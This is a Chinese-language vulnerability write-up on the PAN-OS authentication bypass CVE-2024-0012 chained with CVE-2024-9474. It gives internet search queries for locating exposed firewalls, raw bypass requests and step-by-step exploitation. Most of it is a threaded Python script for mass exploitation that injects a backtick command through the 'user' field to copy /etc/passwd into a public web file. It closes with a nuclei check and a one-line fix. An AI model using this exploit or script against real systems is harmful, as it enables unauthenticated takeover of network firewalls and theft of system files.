# 漏洞描述
<font style="color:rgb(52, 58, 64);">Palo Alto Networks PAN-OS GlobalProtect 是Palo Alto Networks 的一款防火墙产品。2024年11日，官方披露CVE-2024-0012 Palo Alto Networks PAN-OS Management 管理端权限绕过漏洞。攻击者可构造恶意请求绕过身份认证，并结合CVE-2024-9474可执行任意命令，控制服务器。</font>

# <font style="color:rgb(52, 58, 64);">漏洞来源</font>
[https://avd.aliyun.com/detail?id=AVD-2024-0012&timestamp__1384=n4%2BxRii%3DDQitO47qBKDsL3O4IxiTvY4D5wApRQx](https://avd.aliyun.com/detail?id=AVD-2024-0012&timestamp__1384=n4%2BxRii%3DDQitO47qBKDsL3O4IxiTvY4D5wApRQx)

# 影响范围
+ PAN-OS 10.2 < 10.2.12-h2
+ PAN-OS 11.0 < 11.0.6-h1
+ PAN-OS 11.1 < 11.1.5-h1
+ PAN-OS 11.2 < 11.2.4-h1

# 搜索语法
+ QUAKE 语法：app:"Palo Alto 网络防火墙"
+ fofa 语法：icon_hash="873381299"

# 披露时间
<font style="color:rgb(33, 37, 41);">2024-11-19</font>

# <font style="color:rgb(33, 37, 41);">漏洞复现</font>
[https://blog.csdn.net/qq_44159028/article/details/144194646](https://blog.csdn.net/qq_44159028/article/details/144194646)

漏洞验证

```http
GET /php/utils/CmsGetDeviceSoftwareVersion.php/.js.map HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Connection: keep-alive
Accept: */*
Accept-Language: en
X-PAN-AUTHCHECK: off
Accept-Encoding: gzip, deflate, br
 
```

![](https://cdn.nlark.com/yuque/0/2024/png/46595937/1734417279305-b617f603-9b66-43ed-b552-48f87dcb11ba.png)

漏洞利用

 第一步：发送数据包，执行认证绕过获得 PHPSESSID，并执行命令 id，将结果保存到指定文件  

![](https://cdn.nlark.com/yuque/0/2024/png/46595937/1734417451751-754826a3-8027-41a3-bc7b-e7043f626791.png)

 第二步：使用第一步获取的PHPSESSID，请求index.php/.js.map 触发第一步的请求，执行命令  

![](https://cdn.nlark.com/yuque/0/2024/png/46595937/1734417469339-aac7d41d-e07d-4b5e-825e-8926a60f1759.png)

 第三步：请求第一步中命令写入的文件，验证命令是否执行，id 执行成功，并且能访问到执行结果  

![](https://cdn.nlark.com/yuque/0/2024/png/46595937/1734417486892-0b25feea-65ee-4a0a-b109-6317a95f8186.png)

# py脚本
```python
#coding:utf-8
import argparse
import requests
import re
import time
import random
import base64
import json
import concurrent.futures
import sys
import urllib.parse

# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings()

timeout = 10  # 请求超时时间

def session(url,proxies={}):
    if not url.startswith(('http://', 'https://')):
        # 如果没有，就添加 'http://'
        url = 'http://' + url
    headers = {
        'X-PAN-AUTHCHECK': 'off',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = {
        'user': '`cat /etc/passwd > /var/appweb/htdocs/unauth/x1.php`',
        'userRole': 'superuser',
        'remoteHost': '',
        'vsys': 'vsys1'
    }
    aurl = url + '/php/utils/createRemoteAppwebSession.php/x1.js.map'
    try:
        r = requests.post(aurl, headers=headers, data=data, verify=False, allow_redirects=False, timeout=timeout,proxies=proxies)
        if r and 'PHPSESSID' in r.cookies:
            phpsessid = r.cookies['PHPSESSID']
            verify(url, phpsessid, proxies={})
            return phpsessid
        else:
            print('PHPSESSID not found')
            return None
    except requests.exceptions.RequestException as e:
        print(e)

def verify(url, phpsessid, proxies={}):
    headers = {
        'Cookie': f'PHPSESSID={phpsessid}',
        'X-PAN-AUTHCHECK': 'off',
        'Connection': 'keep-alive'
    }
    burl = url + '/index.php/.js.map'
    try:
        r = requests.get(burl, headers=headers, proxies=proxies, verify=False, allow_redirects=False, timeout=timeout)
        if r.status_code == 200 and r.text:
            curl = url + '/unauth/x1.php'
            headers = {
                'Cookie': f'PHPSESSID={phpsessid}',
                'X-PAN-AUTHCHECK': 'off',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            r = requests.get(curl, headers=headers, proxies=proxies, verify=False, allow_redirects=False, timeout=timeout)
            if r.status_code == 200 and 'root:' in r.text:
                print('\033[1;31m' + '[+] Success ' + url + '\033[0m')
                with open('cve-2024-0012.txt', 'a') as f:
                    f.write(url + '\n')
        else:
            print("[-] No vulnerabilities found")
    except requests.exceptions.RequestException as e:
        print(e)

def pl(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
        return urls
    except Exception as e:
        print(f"[-] Error reading file {filename}: {e}")
        return []

def help():
    # helpinfo = """ """
    # print(helpinfo)
    print("cve-2024-0012".center(100, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -f --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -p --proxies 代理设置")
    print(f"[+]{sys.argv[0]} -t --thread 线程设置，默认为10")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")
    print("--@ztomato".rjust(100," "))

def main():
    parser = argparse.ArgumentParser(description='@ztomato')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    parser.add_argument('-t','--thread',type=int, help='线程，默认为10')
    parser.add_argument('-p', '--proxies', type=str, help='代理设置，如 http://127.0.0.1:8080')
    args = parser.parse_args()

    proxies = {}
    if args.proxies:
        proxies = {'http': args.proxies, 'https': args.proxies}

    if args.url:
        verify(args.url, proxies=proxies)
    elif args.file:
        urls = pl(args.file)
        if not urls:
            print(f"[-] No valid URLs found in {args.file}")
            return

        thread = 10
        if args.thread:
            thread = args.thread
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            # 使用 executor.map 实现并发调用
            results = list(executor.map(lambda url: session(url, proxies=proxies), urls))
            # 可选：打印结果
            # for result in results:
            #     if result and result.get('isVul'):
            #         print(f"[+] Vulnerability confirmed for {result['url']}")
    else:
        help()

if __name__ == '__main__':
    main()
```

# nuclei
```python
 
id: palo-alto-vpn-CVE-2024-0012-check-wt
 
info:
  name: Palo Alto PAN-OS Authentication Bypass in the Management Web Interface CVE-2024-0012
  author: watchTowr
  severity: critical
  description: An authentication bypass in Palo Alto Networks PAN-OS software enables an unauthenticated attacker with network access to the management web interface to gain PAN-OS administrator privileges to perform administrative actions, tamper with the configuration, or exploit other authenticated privilege escalation vulnerabilities like CVE-2024-9474.
  tags: palo-alto
  metadata:
    max-request: 4
 
http:
  - method: GET
    path:
      - "{{BaseURL}}/php/utils/CmsGetDeviceSoftwareVersion.php/.js.map"
 
    headers:
      X-PAN-AUTHCHECK: off
 
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        condition: or
        words:
          - "0.0.0"
 
 
      - type: status
        status:
          - 200
 
      - type: word
        part: header
        words:
          - "Expires: 0"
          - "PHPSESSID="
          - "application/json"
```

# <font style="color:rgb(33, 37, 41);">修复建议</font>
<font style="color:rgb(52, 58, 64);">升级至最新版本。</font>

